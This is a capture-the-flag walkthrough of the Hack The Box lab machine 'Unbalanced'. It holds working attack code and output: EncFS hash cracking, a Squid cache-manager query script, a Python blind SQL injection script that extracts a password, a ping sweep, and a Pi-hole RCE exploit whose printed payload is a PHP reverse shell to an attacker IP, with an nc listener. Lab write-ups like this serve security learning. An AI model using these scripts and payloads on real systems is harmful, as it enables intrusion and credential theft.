@@ -1,0 +1,767 @@
+---
+layout: menu
+title: "HTB Unbalanced"
+description: "10.10.10.200 | 40 pts"
+header-img: "boxes/screenshots/49_unbalanced/unbalanced.png"
+tags: [hackthebox, htb, boot2root, writeup, linux, unbalanced, squid, squid proxy, rsync, nfs, encnfs, encrypted nfs, blind sql injection, sql injection, boolean-based sql injection, pi-hole, metasploit, password reuse]
+---
+
+:filesdir: /boxes/files/49_unbalanced/
+:imagesdir: /boxes/screenshots/49_unbalanced/
+:page-liquid:
+:source-highlighter: rouge
+
++++<h1 style="color:red">+++ HTB Unbalanced (10.10.10.200) +++</h1>+++
+
+---
+
+:toc: 
+:toc-title: TABLE OF CONTENTS
+
+---
+
+== PART 1 : INITIAL RECON
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ nmap -oN nmap.tcp.initial --min-rate 5000 -p- -v 10.10.10.200
+  
+  PORT     STATE SERVICE
+  22/tcp   open  ssh
+  873/tcp  open  rsync
+  3128/tcp open  squid-http
+
+$ nmap -oN nmap.tcp.unbalanced -p 22,873,3128 -sC -sV -T4 10.10.10.200
+
+  PORT     STATE SERVICE    VERSION
+  22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+  | ssh-hostkey: 
+  |   2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)
+  |   256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)
+  |_  256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)
+  873/tcp  open  rsync      (protocol version 31)
+  3128/tcp open  http-proxy Squid http proxy 4.6
+  |_http-server-header: squid/4.6
+  |_http-title: ERROR: The requested URL could not be retrieved
+  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+----
+____
+
+---
+
+== PART 2 : PORT ENUMERATION
+
++++<span style="color:orange">+++*`rsync`*+++</span>+++ seems to be open on port 873 and checking if there are any shared folders:
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ rsync -av --list-only rsync://10.10.10.200
+
+  conf_backups    EncFS-encrypted configuration backups
+
+----
+____
+
+There is a shared folder named, +++<span style="color:orange">+++*`conf_backups`*+++</span>+++, which based on the description is probably an encrypted file share but it contains config files so some sort of credentials might be lying around somewhere.
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ rsync -av rsync://10.10.10.200/conf_backups ./conf_backups
+
+  receiving incremental file list
+  ./
+  ,CBjPJW4EGlcqwZW4nmVqBA6
+  -FjZ6-6,Fa,tMvlDsuVAO7ek
+  .encfs6.xml
+  0K72OfkNRRx3-f0Y6eQKwnjn
+  27FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo-
+  2VyeljxHWrDX37La6FhUGIJS
+  3E2fC7coj5,XQ8LbNXVX9hNFhsqCjD-g3b-7Pb5VJHx3C1
+  3cdBkrRF7R5bYe1ZJ0KYy786
+  3xB4vSQH-HKVcOMQIs02Qb9,
+  4J8k09nLNFsb7S-JXkxQffpbCKeKFNJLk6NRQmI11FazC1
+  5-6yZKVDjG4n-AMPD65LOpz6-kz,ae0p2VOWzCokOwxbt,
+  5FTRnQDoLdRfOEPkrhM2L29P
+  5IUA28wOw0wwBs8rP5xjkFSs
+  6R1rXixtFRQ5c9ScY8MBQ1Rg
+  7-dPsi7efZRoXkZ5oz1AxVd-Q,L05rofx0Mx8N2dQyUNA,
+  7zivDbWdbySIQARaHlm3NbC-7dUYF-rpYHSQqLNuHTVVN1
+  8CBL-MBKTDMgB6AT2nfWfq-e
+  8XDA,IOhFFlhh120yl54Q0da
+  8e6TAzw0xs2LVxgohuXHhWjM
+  9F9Y,UITgMo5zsWaP1TwmOm8EvDCWwUZurrL0TwjR,Gxl0
+  A4qOD1nvqe9JgKnslwk1sUzO
+  Acv0PEQX8vs-KdK307QNHaiF
+  B6J5M3OP0X7W25ITnaZX753T
+  Chlsy5ahvpl5Q0o3hMyUIlNwJbiNG99DxXJeR5vXXFgHC1
+  ECXONXBBRwhb5tYOIcjjFZzh
+  F4F9opY2nhVVnRgiQ,OUs-Y0
+  FGZsMmjhKz7CJ2r-OjxkdOfKdEip4Gx2vCDI24GXSF5eB1
+  FSXWRSwW6vOvJ0ExPK0fXJ6F
+  IymL3QugM,XxLuKEdwJJOOpi
+  KPYfvxIoOlrRjTY18zi8Wne-
+  Kb-,NDTgYevHOGdHCYsSQhhIHrUGjiM6i2JZcl,-PKAJm0
+  Kpo3MHQxksW2uYX79XngQu-f
+  KtFc,DR7HqmGdPOkM2CpLaM9
+  Mv5TtpmUNnVl-fgqQeYAy8uu
+  MxgjShAeN6AmkH2tQAsfaj6C
+  Ni8LDatT134DF6hhQf5ESpo5
+  Nlne5rpWkOxkPNC15SEeJ8g,
+  OFG2vAoaW3Tvv1X2J5fy4UV8
+  OvBqims-kvgGyJJqZ59IbGfy
+  StlxkG05UY9zWNHBhXxukuP9
+  TZGfSHeAM42o9TgjGUdOSdrd
+  VQjGnKU1puKhF6pQG1aah6rc
+  W5,ILrUB4dBVW-Jby5AUcGsz
+  Wr0grx0GnkLFl8qT3L0CyTE6
+  X93-uArUSTL,kiJpOeovWTaP
+  Ya30M5le2NKbF6rD-qD3M-7t
+  Yw0UEJYKN,Hjf-QGqo3WObHy
+  Z8,hYzUjW0GnBk1JP,8ghCsC
+  ZXUUpn9SCTerl0dinZQYwxrx
+  ZvkMNEBKPRpOHbGoefPa737T
+  a4zdmLrBYDC24s9Z59y-Pwa2
+  c9w3APbCYWfWLsq7NFOdjQpA
+  cwJnkiUiyfhynK2CvJT7rbUrS3AEJipP7zhItWiLcRVSA1
+  dF2GU58wFl3x5R7aDE6QEnDj
+  dNTEvgsjgG6lKBr8ev8Dw,p7
+  gK5Z2BBMSh9iFyCFfIthbkQ6
+  gRhKiGIEm4SvYkTCLlOQPeh-
+  hqZXaSCJi-Jso02DJlwCtYoz
+  iaDKfUAHJmdqTDVZsmCIS,Bn
+  jIY9q65HMBxJqUW48LJIc,Fj
+  kdJ5whfqyrkk6avAhlX-x0kh
+  kheep9TIpbbdwNSfmNU1QNk-
+  l,LY6YoFepcaLg67YoILNGg0
+  lWiv4yDEUfliy,Znm17Al41zi0BbMtCbN8wK4gHc333mt,
+  mMGincizgMjpsBjkhWq-Oy0D
+  oPu0EVyHA6,KmoI1T,LTs83x
+  pfTT,nZnCUFzyPPOeX9NwQVo
+  pn6YPUx69xqxRXKqg5B5D2ON
+  q5RFgoRK2Ttl3U5W8fjtyriX
+  qeHNkZencKDjkr3R746ZzO5K
+  sNiR-scp-DZrXHg4coa9KBmZ
+  sfT89u8dsEY4n99lNsUFOwki
+  uEtPZwC2tjaQELJmnNRTCLYU
+  vCsXjR1qQmPO5g3P3kiFyO84
+  waEzfb8hYE47wHeslfs1MvYdVxqTtQ8XGshJssXMmvOsZLhtJWWRX31cBfhdVygrCV5
+
+  sent 1,452 bytes  received 411,990 bytes  28,513.24 bytes/sec
+  total size is 405,603  speedup is 0.98
+
+----
+____
+
+There are a lot of files but it still needs to be decrypted. One way to do this is by using +++<span style="color:orange">+++*`encfs2john`*+++</span>+++:
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ locate encfs
+
+  /usr/share/john/encfs2john.py
+
+$ python3 /usr/share/john/encfs2john.py ./conf_backups
+
+  ./conf_backups:$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44*1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add
+
+$ python3 /usr/share/john/encfs2john.py ./conf_backups > conf_backups.hash
+
+$ john --wordlist=/usr/share/wordlists/rockyou.txt conf_backups.hash
+
+$ john --show conf_backups.hash
+
+  ./conf_backups:bubblegum
+
+  1 password hash cracked, 0 left
+
+$ mkdir conf_backups_dec  
+
+$ encfs $(pwd)/conf_backups $(pwd)/conf_backups_dec
+
+  EncFS Password: bubblegum
+
+----
+____
+
+
+Now that the files have been decrypted, the directory looks like this:
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ ls conf_backups_dec
+
+  50-localauthority.conf              hdparm.conf                      parser.conf
+  50-nullbackend.conf                 host.conf                        protect-links.conf
+  51-debian-sudo.conf                 initramfs.conf                   reportbug.conf
+  70debconf                           input.conf                       resolv.conf
+  99-sysctl.conf                      journald.conf                    resolved.conf
+  access.conf                         kernel-img.conf                  rsyncd.conf
+  adduser.conf                        ldap.conf                        rsyslog.conf
+  bluetooth.conf                      ld.so.conf                       semanage.conf
+  ca-certificates.conf                libaudit.conf                    sepermit.conf
+  com.ubuntu.SoftwareProperties.conf  libc.conf                        sleep.conf
+  dconf                               limits.conf                      squid.conf
+  debconf.conf                        listchanges.conf                 sysctl.conf
+  debian.conf                         logind.conf                      system.conf
+  deluser.conf                        logrotate.conf                   time.conf
+  dhclient.conf                       main.conf                        timesyncd.conf
+  discover-modprobe.conf              mke2fs.conf                      ucf.conf
+  dkms.conf                           modules.conf                     udev.conf
+  dns.conf                            namespace.conf                   update-initramfs.conf
+  dnsmasq.conf                        network.conf                     user.conf
+  docker.conf                         networkd.conf                    user-dirs.conf
+  fakeroot-x86_64-linux-gnu.conf      nsswitch.conf                    Vendor.conf
+  framework.conf                      org.freedesktop.PackageKit.conf  wpa_supplicant.conf
+  fuse.conf                           PackageKit.conf                  x86_64-linux-gnu.conf
+  gai.conf                            pam.conf                         xattr.conf
+  group.conf                          pam_env.conf
+
+----
+____
+
+Since the files are now readable, we can begin searching for interesting information:
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ cd conf_backups_dec
+
+$ cat * | grep -i "pass" | grep -v "\#"
+
+  mozilla/Buypass_Class_2_Root_CA.crt
+  mozilla/Buypass_Class_3_Root_CA.crt
+  Reject-Type: password
+  Name: passwords
+  Accept-Type: password
+  Filename: /var/cache/debconf/passwords.dat
+  Stack: config, passwords
+  passwd:         files systemd
+  ##cachemgr_passwd Thah$Sh1## menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
+  cachemgr_passwd disable all
+
+$ grep --with-filename "cachemgr_passwd" * | grep -v "#"
+
+  squid.conf:cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
+  squid.conf:cachemgr_passwd disable all
+  
+----
+____
+
+There is a password explicitly written in the +++<span style="color:orange">+++*`Squid Proxy`*+++</span>+++ config file. This makes sense being the name of the box is Unbalanced so this must be about a misconfigured load balancer or something as there is an +++<span style="color:orange">+++*`http proxy setup at port 3128`*+++</span>+++.
+
+What was also listed beside the +++<span style="color:orange">+++*`cachemgr_passwd`*+++</span>+++ password are the options we could explore in the Squid Proxy Cache Manager.
+
+I wrote a simple python script in order to explore the cache manager:
+
+____
+[source,python,subs="verbatim,quotes"]
+----
+from base64 import b64encode
+from pwn import *
+import sys
+
+host = "10.10.10.200"
+port = 3128
+req = "GET cache_object://{}:{}/{} HTTP/1.1\r\n".format(host, port, sys.argv[1])
+
+username = ""
+password = "Thah$Sh1"
+creds = b64encode("{}:{}".format(username, password).encode("utf-8"))
+auth = "Authorization: Basic {}\r\n".format(str(creds)[2:-1])
+
+http = "{}{}".format(req, auth)
+squid = remote("10.10.10.200", 3128)
+squid.sendline(http)
+
+while True:
+    try:
+        line = squid.recv().decode("unicode_escape")[:-1]
+        print(line)
+    except: break
+----
+____
+
+And now checking what we could do and get:
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ python3 squid.py menu | grep protected
+
+  menu                   Cache Manager Menu                      protected
+  pconn                  Persistent Connection Utilization Histograms    protected
+  mem                    Memory Utilization                      protected
+  diskd                  DISKD Stats                             protected
+  fqdncache              FQDN Cache Stats and Contents           protected
+  filedescriptors        Process Filedescriptor Allocation       protected
+  objects                All Cache Objects                       protected
+  vm_objects             In-Memory and In-Transit Objects        protected
+  counters               Traffic and Resource Counters           protected
+  5min                   5 Minute Average of Counters            protected
+  60min                  60 Minute Average of Counters           protected
+  histograms             Full Histogram Counts                   protected
+  cbdata                 Callback Data Registry Contents         protected
+  sbuf                   String-Buffer statistics                protected
+  events                 Event Queue                             protected
+
+$ python3 squid.py fqdncache
+
+  [...OMITTED...]
+  Address                                       Flg TTL Cnt Hostnames
+  127.0.1.1                                       H -001   2 unbalanced.htb unbalanced
+  ::1                                             H -001   3 localhost ip6-localhost ip6-loopback
+  172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb
+  172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb
+  127.0.0.1                                       H -001   1 localhost
+  172.17.0.1                                      H -001   1 intranet.unbalanced.htb
+  ff02::1                                         H -001   1 ip6-allnodes
+  ff02::2                                         H -001   1 ip6-allrouters
+----
+____
+
+There are three things interesting here -- +++<span style="color:orange">+++*`intranet.unbalanced.htb`*+++</span>+++ (172.17.0.1), +++<span style="color:orange">+++*`intranet-host2.unbalanced.htb`*+++</span>+++ (172.31.179.2), and +++<span style="color:orange">+++*`intranet-host3.unbalanced.htb`*+++</span>+++ (172.31.179.3).
+
+Opening +++<span style="color:orange">+++*`intranet.unbalanced.htb`*+++</span>+++ after setting up my proxy (Foxy Proxy) leads me to:
+
+____
+.+++<span style="color:orange">+++__Proxy Settings__+++</span>+++
+
+image::foxy_proxy.PNG[Foxy Proxy]
+____
+
+____
+.+++<span style="color:orange">+++__Intranet Landing Page (`/intranet.php`)__+++</span>+++
+
+image::intranet_landing_page.png[Landing Page]
+____
+
+Examining the reponse headers using `curl`:
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ curl -I --proxy "http://10.10.10.200:3128" http://172.17.0.1
+
+  HTTP/1.1 302 Found
+  Server: nginx/1.14.0 (Ubuntu)
+  Date: Sat, 05 Dec 2020 22:12:03 GMT
+  Content-Type: text/html; charset=UTF-8
+  Location: intranet.php
+  Intranet-Host: intranet-host3.unbalanced.htb
+  X-Cache: MISS from unbalanced
+  X-Cache-Lookup: MISS from unbalanced:3128
+  Via: 1.1 unbalanced (squid/4.6)
+  Connection: keep-alive
+----
+____
+
+The internal load balancer will either bring you to +++<span style="color:orange">+++*`intranet-host2`*+++</span>+++ or +++<span style="color:orange">+++*`intranet-host3`*+++</span>+++ which contains a login form and a contact form which doesn't seem to do anything when you submit entries or fail to login.
+
+But then you'll notice something missing... what happened to +++<span style="color:orange">+++*`intranet-host1`*+++</span>+++? Since +++<span style="color:orange">+++host2+++</span>+++ is at +++<span style="color:orange">+++172.31.179.2+++</span>+++ and +++<span style="color:orange">+++host3+++</span>+++ is at +++<span style="color:orange">+++172.31.179.3+++</span>+++, maybe it's at +++<span style="color:orange">+++172.31.179.1+++</span>+++.
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ curl -I --proxy "http://10.10.10.200:3128" http://172.31.179.1
+
+  HTTP/1.1 200 OK
+  Server: nginx/1.14.0 (Ubuntu)
+  Date: Sat, 05 Dec 2020 22:38:45 GMT
+  Content-Type: text/html; charset=UTF-8
+  Intranet-Host: #intranet-host1.unbalanced.htb#
+  X-Cache: MISS from unbalanced
+  X-Cache-Lookup: MISS from unbalanced:3128
+  Via: 1.1 unbalanced (squid/4.6)
+  Connection: keep-alive
+
+$ curl --proxy "http://10.10.10.200:3128" http://172.31.179.1
+
+  Host temporarily taken out of load balancing for security maintenance.
+
+----
+____
+
+And it does exist but this time, when you go to +++<span style="color:orange">+++*`/intranet.php`*+++</span>+++ and try to login, an error message now appears which was not apparent in the other hosted applications.
+
+____
+.+++<span style="color:orange">+++Error Message: Invalid credentials.+++</span>+++
+
+image::intranet_host1_login.png[host1]
+____
+
+---
+
+== PART 3 : EXPLOITATION
+
+After testing a simple SQL injection payload like +++<span style="color:orange">+++*`' or '1'='1`*+++</span>+++, the form seems to be vulnerable as it returns a list of users and their respective roles. It is important to note that the form rejects capital letters so +++<span style="color:orange">+++*`' OR '1'='1`*+++</span>+++ will not work. Comment characters also seem to be rejected.
+
+____
+.+++<span style="color:orange">+++User list+++</span>+++
+
+image::intranet_host1_sqli.png[SQL Injection]
+____
+
+Since we have an error message and given the limitations of the form, maybe it could be leveraged to extract passwords for the listed users. I'll focus on +++<span style="color:orange">+++bryan+++</span>+++ since he has the role of +++<span style="color:orange">+++System Administrator+++</span>+++.
+
+I wrote another python script for this:
+
+____
+[source,python,subs="verbatim,quotes"]
+----
+import requests as r
+
+target = "http://172.31.179.1/intranet.php"
+proxy = { "http": "http://10.10.10.200:3128" }
+
+char_set = "abcdefghihjklmnopqrstuvwxyz0123456789!@$%^&*()=_+,./<>?:"
+password = ""
+while True:
+    for i in char_set:
+        payload = {
+            "Username": "bryan",
+            "Password": "' or substring(Password,{},1)='{}' or '".format(len(password)+1, i)
+        }
+        res = r.post(target, proxies=proxy, data=payload)
+
+        if "bryan@unbalanced.htb" in res.text:
+            password += i
+            print(password)
+            break
+
+    if i == char_set[-1]: break
+----
+
+[source,shell,subs="verbatim,quotes"]
+----
+$ python3 intranet.py
+
+  i
+  ir
+  ire
+  irea
+  ireal
+  ireall
+  ireally
+  ireallyl
+  ireallyl0
+  ireallyl0v
+  ireallyl0ve
+  ireallyl0veb
+  ireallyl0vebu
+  ireallyl0vebub
+  ireallyl0vebubb
+  ireallyl0vebubbl
+  ireallyl0vebubble
+  ireallyl0vebubbleg
+  ireallyl0vebubblegu
+  ireallyl0vebubblegum
+  ireallyl0vebubblegum!
+  ireallyl0vebubblegum!!
+  #ireallyl0vebubblegum!!!#
+----
+____
+
+Checking to see if the password works:
+____
+.+++<span style="color:orange">+++Successful login as bryan+++</span>+++
+
+image::intranet_host1_bryan.png[bryan]
+____
+
+And it does!
+
+---
+
+== PART 3 : GENERATE USER SHELL (bryan)
+
+____
+[source,shell,subs="+macros"]
+----
+$ ssh -l bryan 10.10.10.200
+
+  The authenticity of host '10.10.10.200 (10.10.10.200)' can\'t be established.
+  ECDSA key fingerprint is SHA256:aiHhPmnhyt434Qvr9CpJRZOmU7m1R1LI29c11na1obY.
+  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+  Warning: Permanently added '10.10.10.200' (ECDSA) to the list of known hosts.
+  bryan@10.10.10.200\'s password: ireallyl0vebubblegum!!!
+
++++<span style="color:green">bryan@unbalanced</span>+++:+++<span style="color:#779ECB">~</span>+++$ ls -la
+
+  -rw-r--r-- 1 bryan bryan  798 Jun 17 11:35 TODO
+  -rw-r--r-- 1 root  root    33 Dec  5 14:18 user.txt
+
+----
+____
+
+---
+
+== PART 3 : PRIVILEGE ESCALATION (bryan -> root)
+
+Examining the TODO file in bryan's home directory:
+____
+[source,shell,subs="+macros"]
+----
+
++++<span style="color:green">bryan@unbalanced</span>+++:+++<span style="color:#779ECB">~</span>+++$ cat TODO
+
+  ############
+  # Intranet #
+  ############
+  * Install new intranet-host3 docker [DONE]
+  * Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]
+  * Test intranet-host3 [DONE]
+  * Add intranet-host3 to load balancer [DONE]
+  * Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]
+  * Fix intranet-host2 [DONE]
+  * Re-add intranet-host2 to load balancer (set default weight) [DONE]
+  - Fix intranet-host1 [TODO]
+  - Re-add intranet-host1 to load balancer (set default weight) [TODO]
+  
+  ###########
+  # Pi-hole #
+  ###########
+  * Install Pi-hole docker (only listening on 127.0.0.1) [DONE]
+  * Set temporary admin password [DONE]
+  * Create Pi-hole configuration script [IN PROGRESS]
+  - Run Pi-hole configuration script [TODO]
+  - Expose Pi-hole ports to the network [TODO]
+
+----
+____
+
+The file basically confirms the path to user where intranet-host1 is being troubleshooted but the important thing here is that there is a +++<span style="color:orange">+++Pi-hole service+++</span>+++ running but is only available locally. It uses a temporary password so it's probably insecure and new credentials may probably be found in the configuration script being created as of the moment.
+
+Checking to see what we can connect to locally:
+
+____
+[source,shell,subs="+macros,verbatim,quotes"]
+----
+
++++<span style="color:green">bryan@unbalanced</span>+++:+++<span style="color:#779ECB">~</span>+++$ ss -plnt | grep 127.0.0.1
+
+  LISTEN    0         128              #127.0.0.1:8080#             0.0.0.0:*       
+  LISTEN    0         128              127.0.0.1:5553             0.0.0.0:*
+
++++<span style="color:green">bryan@unbalanced</span>+++:+++<span style="color:#779ECB">~</span>+++$ curl http://127.0.0.1:8080/
+
+  [ERROR]: Unable to parse results from <i>queryads.php</i>: <code>Unhandled error message (<code>Invalid domain!</code>)</code>
+
+----
+____
+
+There is an error when trying to access the service running at port 8080 locally but according to this link:https://www.reddit.com/r/pihole/comments/ca9d45/problems_with_admin_interface_on_docker/[Reddit thread,window=_blank], it seems like you can go directly to +++<span style="color:orange">+++/admin/+++</span>+++.
+
+____
+[source,shell,subs="+macros,verbatim,quotes"]
+----
+
++++<span style="color:green">bryan@unbalanced</span>+++:+++<span style="color:#779ECB">~</span>+++$ curl -I http://127.0.0.1:8080/admin/
+
+  HTTP/1.1 200 OK
+  X-Pi-hole: The Pi-hole Web interface is working!
+  X-Frame-Options: DENY
+  Set-Cookie: #PHPSESSID=icng7lp4cktfauu6lt26inrot0; path=/#
+  Expires: Thu, 19 Nov 1981 08:52:00 GMT
+  Cache-Control: no-store, no-cache, must-revalidate
+  Pragma: no-cache
+  Content-type: text/html; charset=UTF-8
+  Date: Sun, 06 Dec 2020 00:09:08 GMT
+  Server: lighttpd/1.4.45
+----
+____
+
+The Pi-hole service can now be reached! However, it's running via docker so I decided to look for an IP it might be running from and maybe access it via Squid Proxy. Looking back into the file, squid.conf:
+
+____
+[source,shell,subs="+macros,verbatim,quotes"]
+----
++++<span style="color:green">bryan@unbalanced</span>+++:+++<span style="color:#779ECB">~</span>+++$ cat squid.conf | grep dst
+
+  acl intranet dstdomain -n intranet.unbalanced.htb
+  #acl intranet_net dst -n 172.16.0.0/12#
+
++++<span style="color:green">bryan@unbalanced</span>+++:+++<span style="color:#779ECB">~</span>+++$ cat squid.conf | grep intranet_net
+
+  acl intranet_net dst -n 172.16.0.0/12
+  #http_access allow intranet_net#
+----
+____
+
++++<span style="color:orange">+++Access to the IP range 172.16.0.0/12 (172.16.0.0 – 172.31.255.255) is allowed+++</span>+++ via the proxy and checking the interfaces available to the machine, I decided to do a ping sweep in the IP range, 172.31.0.1/16.
+____
+[source,shell,subs="+macros,verbatim,quotes"]
+----
++++<span style="color:green">bryan@unbalanced</span>+++:+++<span style="color:#779ECB">~</span>+++$ ip a | grep "inet "
+  
+  inet 127.0.0.1/8 scope host lo
+  inet 10.10.10.200/24 brd 10.10.10.255 scope global ens160
+  inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+  #inet 172.31.0.1/16 brd 172.31.255.255 scope global br-742fc4eb92b1#
+
++++<span style="color:green">bryan@unbalanced</span>+++:+++<span style="color:#779ECB">~</span>+++$ for x in {1..254}; do for y in {1..254}; do (ping -c1 172.31.$x.$y 2>/dev/null | grep "bytes from" &); done; done
+
+  64 bytes from #172.31.11.3#: icmp_seq=1 ttl=64 time=0.248 ms
+  64 bytes from 172.31.179.2: icmp_seq=1 ttl=64 time=0.175 ms
+  64 bytes from 172.31.179.3: icmp_seq=1 ttl=64 time=0.148 ms
+  64 bytes from 172.31.179.1: icmp_seq=1 ttl=64 time=0.122 ms
+----
+____
+
+Aside from the previous intranet hosts, there is a new host identified --+++<span style="color:orange">+++172.31.11.3+++</span>+++. Trying to access it via Squid Proxy leads you to:
+____
+.+++<span style="color:orange">+++Pi-hole Landing Page+++</span>+++
+
+image::pi-hole_landing_page.png[Pi-hole Landing Page]
+____
+
+Now going to the login page, and remembering that a temporary password is set for the admin account, I tried +++<span style="color:orange">+++"admin"+++</span>+++ and it went through but there is not much to do so I search also for an exploit for the current version of Pi-hole being run.
+____
+.+++<span style="color:orange">+++Pi-hole Login Page+++</span>+++
+
+image::pi-hole_login.png[Pi-hole Login Page]
+____
+____
+.+++<span style="color:orange">+++Pi-hole Admin Panel+++</span>+++
+
+image::pi-hole_admin_panel.png[Pi-hole Admin Panel]
+____
+____
+.+++<span style="color:orange">+++Pi-hole Version+++</span>+++
+
+image::pi-hole_version.png[Pi-hole Version]
+____
+
+Looking for exploits:
+____
+[source,shell,subs="+macros,verbatim,quotes"]
+----
+$ searchsploit pi-hole
+
+  searchsploit pi-hole
+  ------------------------------------------------------------------------------------- ---------------------------------
+   Exploit Title                                                                       |  Path
+  ------------------------------------------------------------------------------------- ---------------------------------
+  Pi-Hole - heisenbergCompensator Blocklist OS Command Execution (Metasploit)          | php/remote/48491.rb
+  #Pi-hole 4.3.2 - Remote Code Execution (Authenticated)                                | python/webapps/48727.py#
+  Pi-hole 4.4.0 - Remote Code Execution (Authenticated)                                | linux/webapps/48519.py
+  Pi-hole < 4.4 - Authenticated Remote Code Execution                                  | linux/webapps/48442.py
+  Pi-hole < 4.4 - Authenticated Remote Code Execution / Privileges Escalation          | linux/webapps/48443.py
+  Pi-Hole Web Interface 2.8.1 - Persistent Cross-Site Scripting in Whitelist/Blacklist | linux/webapps/40249.txt
+  ------------------------------------------------------------------------------------- ---------------------------------
+  Shellcodes: No Results
+
+$ searchsploit -m python/webapps/48727.py
+
+$ python 48727.py
+
+  ╔═╗┬ ┬┌┐┌  ╔═╗┬┬ ┬┌─┐┬  ┌─┐
+  ╠═╝││││││  ╠═╝│├─┤│ ││  ├┤
+  ╩  └┴┘┘└┘  ╩  ┴┴ ┴└─┘┴─┘└─┘
+        by @CyberVaca
+
+  usage: 48727.py [-h] -u URL -p PORT -i IP -pass PASSWORD
+  48727.py: error: argument -u is required
+----
+____
+
+Setting up the exploit -- I forwarded the locally available service inside the machine since HTTP proxies are very unreliable when establishing reverse shells afterwhich I setup a listener via `netcat` in my machine:
+____
+[source,shell,subs="+macros,verbatim,quotes"]
+----
+$ sshpass -p 'ireallyl0vebubblegum!!!' ssh -l bryan -L 8080:127.0.0.1:8080 -f -N 10.10.10.200
+
+$ nc -lvp 4444
+
+  listening on [any] 4444 ...
+----
+____
+
+Then I ran the exploit:
+
+____
+[source,shell,subs="+macros,verbatim,quotes"]
+----
+$ python 48727.py -u http://127.0.0.1:8080 -p 4444 -i 10.10.14.11 -pass admin
+
+  ╔═╗┬ ┬┌┐┌  ╔═╗┬┬ ┬┌─┐┬  ┌─┐
+  ╠═╝││││││  ╠═╝│├─┤│ ││  ├┤
+  ╩  └┴┘┘└┘  ╩  ┴┴ ┴└─┘┴─┘└─┘
+        by @CyberVaca
+
+  [+] Token: TYiXiwh9ctRRTAHZ/5bZz/HX3vfihy6jvq8BYk1yb9w=
+  [+] Payload: php -r '$sock=fsockopen("10.10.14.11", 4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+  [+] Sending Payload...
+----
+____
+
+Going back to the listener:
+____
+[source,shell,subs="+macros,verbatim,quotes"]
+----
+$ id
+  
+  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+$ hostname
+  
+  pihole.unbalanced.htb
+
+$ cd /root
+
+$ ls -l
+
+  -rw-r--r-- 1 root root 113876 Sep 20  2019 ph_install.sh
+  -rw-r--r-- 1 root root    485 Apr  6  2020 pihole_config.sh
+
+$ cat pihole_config.sh
+
+  \#!/bin/bash
+
+  # Add domains to whitelist
+  /usr/local/bin/pihole -w unbalanced.htb
+  /usr/local/bin/pihole -w rebalanced.htb
+
+  # Set temperature unit to Celsius
+  /usr/local/bin/pihole -a -c
+
+  # Add local host record
+  /usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1
+
+  # Set privacy level
+  /usr/local/bin/pihole -a -l 4
+
+  # Set web admin interface password
+  /usr/local/bin/pihole -a -p '##bUbBl3gUm$43v3Ry0n3!##'
+
+  # Set admin email
+  /usr/local/bin/pihole -a email admin@unbalanced.htb
+  
+----
+____
+
+The `/root` directory is readable and in there is the Pi-hole config file mentioned earlier. A new password is visible and maybe this could be used to `su` to root:
+____
+[source,shell,subs="+macros,verbatim,quotes"]
+----
++++<span style="color:green">bryan@unbalanced</span>+++:+++<span style="color:#779ECB">~</span>+++$ su -
+
+  Password: bUbBl3gUm$43v3Ry0n3!
+
++++<span style="color:green">root@unbalanced</span>+++:+++<span style="color:#779ECB">~</span>+++# id
+
+  uid=0(root) gid=0(root) groups=0(root)
+
++++<span style="color:green">root@unbalanced</span>+++:+++<span style="color:#779ECB">~</span>+++# ls -l
+
+  -rw------- 1 root root 33 Dec  5 14:18 root.txt
+
+----
+____
+
+And now, we have root!
